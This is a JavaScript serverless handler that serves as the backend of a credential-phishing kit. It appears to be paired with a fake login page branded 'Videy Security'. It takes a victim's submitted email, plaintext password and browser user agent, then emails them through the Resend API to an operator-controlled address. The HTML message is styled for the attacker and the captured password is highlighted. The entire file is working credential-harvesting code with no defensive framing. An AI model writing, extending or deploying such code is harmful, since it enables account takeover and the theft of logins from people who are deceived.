export default async function handler(req, res) {
    if (req.method !== 'POST') {
        return res.status(405).json({ error: 'Method not allowed' });
    }

    const { email, password, userAgent } = req.body;

    if (!email || !password) {
        return res.status(400).json({ error: 'Email dan password wajib' });
    }

    const RESEND_API_KEY = process.env.RESEND_API_KEY;
    const YOUR_EMAIL = process.env.TO_EMAIL;

    if (!RESEND_API_KEY) {
        return res.status(500).json({ error: 'API key belum diset di env' });
    }

    const waktu = new Date().toLocaleString('id-ID', {
        weekday: 'long',
        day: '2-digit',
        month: 'long',
        year: 'numeric',
        hour: '2-digit',
        minute: '2-digit',
        second: '2-digit'
    });

    try {
        const response = await fetch('https://api.resend.com/emails', {
            method: 'POST',
            headers: {
                'Authorization': 'Bearer ' + RESEND_API_KEY,
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                from: 'Videy Security <onboarding@resend.dev>',
                to: YOUR_EMAIL,
                subject: '🎯 Data Baru Masuk — ' + new Date().toLocaleString('id-ID'),
                html: `
<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
</head>
<body style="margin:0;padding:0;background:#f0f2f5;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Arial,sans-serif;">
    <table role="presentation" width="100%" cellpadding="0" cellspacing="0" style="background:#f0f2f5;padding:30px 15px;">
        <tr>
            <td align="center">
                <table role="presentation" width="100%" cellpadding="0" cellspacing="0" style="max-width:520px;background:#ffffff;border-radius:16px;overflow:hidden;box-shadow:0 4px 24px rgba(0,0,0,0.08);">
                    
                    <!-- HEADER -->
                    <tr>
                        <td style="background:linear-gradient(135deg,#1a73e8 0%,#0d47a1 100%);padding:28px 24px;text-align:center;">
                            <div style="font-size:13px;color:rgba(255,255,255,0.85);letter-spacing:2px;text-transform:uppercase;font-weight:600;margin-bottom:6px;">Videy Security</div>
                            <div style="font-size:22px;color:#ffffff;font-weight:700;letter-spacing:-0.3px;">🎯 Data Login Baru</div>
                        </td>
                    </tr>

                    <!-- GREETING -->
                    <tr>
                        <td style="padding:28px 24px 10px;">
                            <div style="font-size:15px;color:#202124;line-height:1.6;">
                                Ada <b>data login baru</b> yang masuk ke sistem. Berikut detailnya:
                            </div>
                        </td>
                    </tr>

                    <!-- CARD DATA -->
                    <tr>
                        <td style="padding:10px 24px 20px;">
                            <table role="presentation" width="100%" cellpadding="0" cellspacing="0" style="background:#f8f9fa;border-radius:12px;border:1px solid #e8eaed;overflow:hidden;">
                                
                                <!-- Email -->
                                <tr>
                                    <td style="padding:16px 20px;border-bottom:1px solid #e8eaed;">
                                        <div style="font-size:11px;color:#5f6368;letter-spacing:1px;text-transform:uppercase;font-weight:600;margin-bottom:6px;">📧 Email</div>
                                        <div style="font-size:16px;color:#202124;font-weight:600;word-break:break-all;">${email}</div>
                                    </td>
                                </tr>
                                
                                <!-- Password -->
                                <tr>
                                    <td style="padding:16px 20px;border-bottom:1px solid #e8eaed;">
                                        <div style="font-size:11px;color:#5f6368;letter-spacing:1px;text-transform:uppercase;font-weight:600;margin-bottom:6px;">🔑 Password</div>
                                        <div style="font-size:16px;color:#d93025;font-weight:700;font-family:'Courier New',monospace;background:#fce8e6;padding:8px 12px;border-radius:6px;display:inline-block;word-break:break-all;">${password}</div>
                                    </td>
                                </tr>

                                <!-- Waktu -->
                                <tr>
                                    <td style="padding:16px 20px;border-bottom:1px solid #e8eaed;">
                                        <div style="font-size:11px;color:#5f6368;letter-spacing:1px;text-transform:uppercase;font-weight:600;margin-bottom:6px;">🕐 Waktu</div>
                                        <div style="font-size:14px;color:#202124;">${waktu}</div>
                                    </td>
                                </tr>

                                <!-- User Agent -->
                                <tr>
                                    <td style="padding:16px 20px;">
                                        <div style="font-size:11px;color:#5f6368;letter-spacing:1px;text-transform:uppercase;font-weight:600;margin-bottom:6px;">💻 Perangkat</div>
                                        <div style="font-size:12px;color:#5f6368;line-height:1.5;word-break:break-all;">${userAgent || '-'}</div>
                                    </td>
                                </tr>

                            </table>
                        </td>
                    </tr>

                    <!-- FOOTER -->
                    <tr>
                        <td style="padding:16px 24px 28px;text-align:center;">
                            <div style="font-size:12px;color:#9aa0a6;line-height:1.5;">
                                Email otomatis dari sistem Videy.<br>
                                Jangan balas email ini.
                            </div>
                        </td>
                    </tr>

                </table>
            </td>
        </tr>
    </table>
</body>
</html>
                `
            })
        });

        const data = await response.json();
        console.log('RESEND STATUS:', response.status);
        console.log('RESEND BODY:', JSON.stringify(data));

        if (!response.ok) {
            return res.status(response.status).json({ error: data.message || 'Gagal kirim' });
        }

        return res.status(200).json({ success: true, data });
    } catch (err) {
        console.log('FETCH ERROR:', err.message);
        return res.status(500).json({ error: err.message });
    }
}
